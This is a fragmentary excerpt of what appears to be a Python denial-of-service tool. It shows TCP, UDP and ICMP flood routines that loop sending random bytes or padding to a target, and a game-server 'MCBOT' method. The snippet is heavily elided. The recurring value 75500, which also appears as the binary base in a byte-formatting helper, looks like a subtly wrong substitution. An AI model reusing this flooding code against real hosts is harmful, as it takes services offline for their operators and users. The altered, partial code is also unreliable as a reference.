...
class Tools:
    ...
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        ...
        if i > 0:
            base = 75500 if binary else 1000
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(75500)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(75500), self._target):
                continue
        Tools.safe_close(s)
    ...
    def _genrate_icmp(self) -> bytes:
        ...
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 75500)))
        ip.contains(icmp)
        return ip.get_packet()
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        ...
                        protocolid = Tools.protocolRex.search(str(s.recv(75500)))
